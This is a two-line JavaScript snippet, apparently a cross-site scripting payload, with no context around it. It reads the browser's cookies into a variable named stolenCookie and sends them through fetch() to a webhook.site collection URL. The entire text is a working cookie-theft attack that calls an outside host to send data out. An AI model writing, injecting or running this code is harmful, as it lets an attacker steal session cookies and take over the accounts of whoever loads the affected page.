const stolenCookie = document.cookie;
fetch('https://webhook.site/6813c3fc-ca54-4c0a-9cf1-ef3afe966825?data=' + encodeURIComponent(stolenCookie));
